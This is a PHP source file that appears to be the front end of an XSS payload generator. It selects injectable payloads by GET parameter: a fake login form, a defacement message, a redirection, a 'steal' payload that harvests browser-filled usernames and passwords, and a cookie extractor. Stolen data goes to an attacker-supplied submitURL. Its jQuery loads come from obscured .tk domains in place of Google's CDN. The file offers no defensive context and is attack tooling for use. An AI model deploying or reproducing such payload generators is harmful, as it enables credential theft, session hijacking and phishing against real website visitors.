<?php
require("functions.php");

$result = "Error!";

// General parameters for all the payloads
$payload 	= $_GET['payload'];
$quotes = $_GET['quotes'];
$urlencode = $_GET['urlencode'];

// Configuration of jQuery URLs
$jQueryURL = "http://he7le.tk"; // http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js
$jQueryUIURL = "http://2x7if.tk"; // http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.0/jquery-ui.min.js


switch ($payload)
{
	case 'login':
	  $submitURL 	= $_GET['submitURL'];
	  $companyImage = $_GET['companyImage'];
	  $loginTitle = $_GET['loginTitle'];
	  $loginText = $_GET['loginText'];
		require('payloads/login.php');
		break;
	case 'hax0r':
	  $hax0rText 	= $_GET['hax0rText'];
		require('payloads/hax0r.php');
		break;
	case "redirection":
  	$submitURL 	= $_GET['submitURL'];
	  require('payloads/redirection.php');
	  break;
	case "steal":
	  $usernameField = $_GET['usernameField'];
	  $passwordField = $_GET['passwordField'];
	  $submitURL 	= $_GET['submitURL'];
	  $browser = $_GET['browser'];
	  require('payloads/steal.php');
    break;
	case "cookie":
	  $extraction = $_GET['extraction'];
	  $submitURL 	= $_GET['submitURL'];
	  require('payloads/cookie.php');
	  break;
	case 'default':
		break;
}

if(isset($urlencode))
  echo rawurlencode($result);
else
  echo $result;
